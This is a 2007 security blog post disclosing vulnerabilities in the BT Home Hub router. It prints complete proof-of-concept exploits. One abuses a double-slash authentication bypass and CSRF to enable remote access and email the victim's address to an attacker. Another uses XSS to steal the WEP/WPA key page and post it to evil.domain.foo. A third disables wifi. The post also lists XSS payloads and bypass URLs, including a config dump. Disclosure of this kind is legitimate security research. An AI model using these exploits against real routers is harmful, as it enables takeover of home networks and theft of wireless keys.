---
title: BT Home Flub Pwnin The BT Home Hub (4)
author: adrian-pastor
date: Thu, 08 Nov 2007 11:33:13 GMT
template: this/views/post.jade
---

The following are the full details of the vulnerabilities we reported ([BID 25972](http://www.securityfocus.com/bid/25972)) to BT regarding their Home Hub router. We are going to have a brief detail on all POCs. If you have any suggestions, recommendations or corrections, do not hesitate to [contact us](http://www.gnucitizen.org/contact). _All the vulnerabilities and demo exploits discussed below have been tested on version `6.2.2.6` of the firmware, unless otherwise specified. Have fun and be responsible!_

### Exploit #1: Enable remote assistance and notify intruder when victim Home Hub is owned

This is the exploit [shown](/blog/bt-home-flub-pwnin-the-bt-home-hub) in our first demo video on which we forge the **enable remote assistance** request using an authentication bypass bug we found within the router firmware. Even if the victim has changed the password, the request will still go through no matter what. After successful exploitation, the attacker is notified via email with the URL (IP address) needed to control the Home Hub remotely.

In our exploit we set the credentials **tech:12345678**. Notice the double forward slash in the **action** attribute which allows us to bypass the authentication! The exploit Proof of Concept code follows:

    <html>
    <!-- index.html -->
    <head>
    <script>

    function redirect() {

           targetURL="http://www.google.com/search?ie=UTF-8&oe=UTF-8&sourceid=navclient&gfns=1&q=techno+viking";
           notifyURL="http://www.attackersdomain.com/notify.php";
           imgsrc = 'http://192.168.1.254/images/head_wave.gif';
           fingerprint_img = new Image();

           fingerprint_img.onerror = function (evt) {
                   ; //alert(this.src + " can't be loaded.");
           }

           // only notify attacker only if potential vulnerable Thomson
    Speedtouch / BT Homehub router found
           fingerprint_img.onload = function (evt) {
                   //alert(this.src + " is loaded.");
                   C=new Image();
                   C.src=notifyURL;
           }

           fingerprint_img.src = imgsrc;
           setTimeout("document.location=targetURL", 500);
    }
    </script>
    </head>

    <body>

    <iframe onload="redirect()" frameborder=0 height=0 width=0
    src="./ras.html"></iframe>

    </body>
    </html>

    <html>
    <!-- ras.html -->
    <head></head>
    <body>

    <form name='raccess'
    action='http://192.168.1.254/cgi/b/ras//?ce=1&be=1&l0=5&l1=5'
    method='post'>
    <input type='hidden' name='0' value='31'>
    <input type='hidden' name='1' value=''>
    <input type='hidden' name='30' value='12345678'>
    <!-- <input type='submit' value="own it!"> -->
    </form>
    <script>document.raccess.submit();</script>
    </body>
    </html>

    <?php
    // notify.php
    define("RCPT_EMAIL", "bthomehubevil@mailinator.com");
    define("EMAIL_SUBJECT", "[OWNED]");

    $messagebody="victim: https://".$_SERVER['REMOTE_ADDR'].":51003\n";
    mail(RCPT_EMAIL, EMAIL_SUBJECT, $messagebody);
    ?>

    ### Exploit #2: Steal page containing WEP/WPA key

    The following exploit simply steals the WEP/WPA key from the router. In some situations this is all the attackers need. The exploit URL looks like the following:

    http://192.168.1.254/cgi/b/ic/connect/?url="><script%20src=http://www.attackersdomain.com/xss.js></script><a%20b%3d

    // xss.js

    // important - won't work without having a body
    document.write("<body>");

    // xhr() - WORKS ON BOTH FF2 AND IE7!
    // original code from developer.apple.com
    var req;

    // we steal the page that returns the WEP/WPA key. no auth required, can you believe it?

    var url="/cgi/b/_wli_/seccfg/?ce=1&be=1&l0=4&l1=0";

    function loadXMLDoc(url)
    {
            req = false;
            // branch for native XMLHttpRequest object
            if(window.XMLHttpRequest && !(window.ActiveXObject))
            {
                    try
                    {
                            req = new XMLHttpRequest();
                    }
                    catch(e)
                    {
                            req = false;
                    }
            // branch for IE/Windows ActiveX version
            }

            else if(window.ActiveXObject)
            {
                    try
                    {
                            req = new ActiveXObject("Msxml2.XMLHTTP");
                    }
                    catch(e)
                    {
                            try
                            {
                                    req = new ActiveXObject("Microsoft.XMLHTTP");
                            }
                            catch(e)
                            {
                                    req = false;
                            }
                    }
            }
            if(req)
            {
                    req.onreadystatechange = processReqChange;
                    req.open("GET", url, true);
                    req.send("");
            }
    }
    // end of loadXMLDoc(url)

    function processReqChange()
    {
            // only if req shows "loaded"
            if (req.readyState == 4)
            {
                    // only if "OK"
                    if (req.status == 200)
                    {
                            // ...processing statements go here...
                            //alert(escape(req.responseText));

                            var f=document.createElement("form");
                            f.name="myform";
                            // where you want the captured data to be submitted to
                            f.action="http://evil.domain.foo/bthh/steal.php";
                            // POST is handy for submitting large chuncks of data
                            f.method="POST";
                            var t = document.createElement('INPUT');
                            t.type='hidden';
                            t.name='data';
                            t.value=escape(req.responseText);
                            f.appendChild(t);
                            document.body.appendChild(f);
                            f.submit();
                    }
            }
    }

    loadXMLDoc(url);

    // end of body
    document.write("</body>");

    <?php
    // steal.php
    define("RCPT_EMAIL", "unknown.pentester@gmail.com");
    define("EMAIL_SUBJECT", "[OWNED]");
    $messagebody="victim router: ".$_SERVER['REMOTE_ADDR']."\n";

    if($_REQUEST['data']) {
            $messagebody=$messagebody."page containing WEP/WPA key:".$_REQUEST['data'];
            mail(RCPT_EMAIL, EMAIL_SUBJECT, $messagebody);
    }
    ?>

    ### Exploit #3: Disable wireless connectivity

    This PoC will disable your Wifi permanently unless you re-enable it manually after successful exploitation! In order to re-enable the Wifi interface you can reset to factory settings, or re-enable the setting by connecting to the Home Hub through the ethernet interface. I am not sure what this exploit can be used for but at least it shows a potential quite devastating danger.

    <html>
    <!-- index.html -->
    <iframe onload="javascript:document.body.innerHTML='<html><h1>PWNED!</h1>'" name="hack" frameborder=0 height=0 width=0 src="./disable_wifi_interface.html"></iframe>
    </html>

    <html>
    <body>
    <!-- disable_wifi_interface.html -->

    <!--
        POST /cgi/b/_wli_/cfg/?ce=1&be=1&l0=4&l1=0&name= HTTP/1.1

        0=10&1=&32=&33=&34=2&35=1&45=11&47=1
    -->

    <form action="http://192.168.1.254/cgi/b/_wli_/cfg//" method="post">

    <input type="hidden" name="0" value="10">
    <input type="hidden" name="1" value="">
    <input type="hidden" name="32" value="">
    <input type="hidden" name="33" value="">
    <input type="hidden" name="34" value="2">
    <input type="hidden" name="35" value="1">
    <input type="hidden" name="45" value="11">
    <input type="hidden" name="47" value="1">

    </form>
    <script>document.forms[0].submit();</script>

    </body>
    </html>

    _For the rest of this post we are listing all vulnerabilities that were found in the BT Home Hub router._

    ### Vulnerability #1: System-wide CSRF

    The BT Home Hub is vulnerable to CSRF by design. That means that absolutely ANY request can be forged by an attacker. This includes administrative requests. The only requirement for these attacks to work would be to predict the admin password (many users never change the default admin password), or combine it with a authentication bypass bug like the one we found (more on this later).

    As an intruder, you would typically target admin requests that would allow you to compromise the Home Hub. For instance, the following is the request that enables Remote Assistance with a password equals to _PASSW0RD_ (username is **tech**).

    POST /cgi/b/ras/?ce=1&be=0&l0=-1&l1=-1 HTTP/1.1

    0=31&1=&30=PASSW0RD

    _This issue has also been successfully tested on a Thomson Speedtouch 780 (firmware version 6.1.4.3), which is shipped by Bethere in the UK._

    ### Vulnerability #2: Several non-persistent XSS

    There are a few non-persistent XSS. None of them require the victim to be authenticated with the Home Hub for the scripting code (payload) to run. Why is there some functionality/pages available on the web interface without authenticating? Well, don't ask me! Ask BT or Thomson. Several GET parameters are affected:

* Through the `name` parameter (already published on [BID 16839](http://www.securityfocus.com/bid/16839/exploit)):
    http://192.168.1.254/cgi/b/intfs/_intf_/ov/?ce=1&be=0&l0=3&l1=1&name=<script>alert('XSS')</script>
* Through the `url` parameter. This one is a good one because there are not restrictions on the length of the payload or type of characters that can be injected. Plus, it works even if the victim is not authenticated (again, the vulnerable script is available without needing to authenticate)
    http://192.168.1.254/cgi/b/ic/connect/?nm=1&client=192.168.1.64&server=198.18.1.2&event=DNSSpoofed&url="><script>alert('XSS')</script><a%20b="
    http://192.168.1.254/cgi/b/ic/connect/?nm=1&client=&server=&event=DNSSpoofed&url="><script>alert('XSS')</script><a%20b="
    http://192.168.1.254/cgi/b/ic/connect/?url="><script>alert('XSS')</script><a%20b=

    _The last PoC URL has also been successfully tested on a Thomson Speedtouch 780 firmware version 6.1.4.3), which is shipped by Bethere in the UK._

    ### Vulnerability #3: Several persistent XSS

    Persistent XSS on Configuration / Application Sharing / Add new Game or App:

    http://192.168.1.254/cgi/b/games/newserv/?ce=1&be=1&l0=4&l1=5&tid=CREATE_GAME

    A request which takes advantage of this vulnerability may look like the following::

    POST /cgi/b/games/newserv/?ce=1&be=1&l0=4&l1=5&tid=CREATE_GAME HTTP/1.1

    0=10&1=&30=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscrip&33=0&32=ABC+%28Another+Bittorent+Client%29

    On the other hand, there is a persistent XSS on the logs page by attempting to authenticate (with the web server) using a malformed username:

    http://192.168.1.254/cgi/b/events/?ce=1&be=0&l0=3&l1=-1
    http://192.168.1.254/cgi/b/events/

    Oct 27 16:10:19 LOGIN User <code>[XSS_payload_goes_here]` tried to login on [HTTPS] (from 192.168.1.66)</code></pre>

    The line where the payload is returned looks like the following:

    <td class='evenrow' align='left' colspan='3'>LOGIN User <BADCHARSHERE> tried to login on [HTTP] (from 192.168.1.66)</td>

    ### Vulnerability #4: Double-slash Authentication Bypass

    This authentication bypass allows intruders to view any page that would normally require the admin password. Additionally, _any administrative request can be made without requiring the admin password_. The bug is extremely simple to exploit, and works like a charm! By simply requesting the password-protected resource with two forward slashes, the authentication is bypassed completely. I.e.:

* Basic wireless configuration info: `http://192.168.1.254/cgi/b/_wli_/cfg//?ce=1&be=1&l0=4&l1=0`
* Local network information: `http://192.168.1.254/cgi/b/intfs/_intf_/cfg//?ce=1&be=1&l0=4&l1=3&name=`
* Firewall security settings: `http://192.168.1.254/cgi/b/secpol/cfg//` and `http://192.168.1.254/cgi/b/secpol/cfg//?ce=1&be=1&l0=4&l1=7`
* Internet connection information: `http://192.168.1.254/cgi/b/is/_pppoa_/ov//?ce=1&be=1&l0=4&l1=2`
* Game and Application sharing: `http://192.168.1.254/cgi/b/games/cfg//?ce=1&be=1&l0=4&l1=5` and `http://192.168.1.254/cgi/b/games/cfg//`
* Remote assistance: `http://192.168.1.254/cgi/b/ras//`
* Backup and Restore: `http://192.168.1.254/cgi/b/bandr//`
* _Dump config file_: `http://192.168.1.254/cgi/b/backup/user.ini//`

    Not only administrative pages can be viewed without a password, but administrative changes can also be made. I.e.: the following request enables remote assistance without requiring a password:

    POST /cgi/b/ras//?ce=1&be=1&l0=5&l1=5 HTTP/1.1

    0=31&1=&30=12345678

    _The previous request could be performed by a malicious website through a hidden form as shown in Exploit #1._

    ### Vulnerability #5: A-to-C authentication bypass

    Let me explain what I mean by _A-to-C authentication bypass_. Sometimes on a application we're supposed to go through an intermediate B point before we reach C. However, sometimes, knowing C in advance might allow you to gain access to data without going through B. In this case, by simply knowing URLs that would only be accessible to authenticated admin users, an attacker can bypass the password prompt completely.

    For instance, some pages that are only available after accessing the _Advanced_ section are supposed to require a password to be accessed, but can be accessed without authenticating. i.e.:

    http://192.168.1.254/cgi/b/_wli_/seccfg/?ce=1&be=1&l0=4&l1=0

Keep in mind that the WEP/WPA key in the clear. There are other pages whose links can only be seen after authenticating, but can actually be accessed without authenticating by simply accessing the URL directly. However, the Wireless Security page is probably the most interesting one.

_BT has finally password-protected the Wireless Security page on firmware version 6.2.6.B._

### Vulnerability #6: Privilege Escalation

BT Home Hubs have three accounts by default: _Basic_, _admin_, and _tech_. Since version 6.2.2.6 of the firmware, saving a backup of the config file and loading a new one is restricted to the _tech_ account which is usually used by BT technical support. However, the _admin_ user can access such functionalities by simply accessing any of the following URLs:

* http://192.168.1.254/cgi/b/backup/user.ini?0=&1=
* http://192.168.1.254/cgi/b/backup/user.ini

_This is pretty much it. I hope that you've learned something new. Again, if you have any ideas, suggestions or aditional information, [contact us](http://www.gnucitizen.org/contact)._
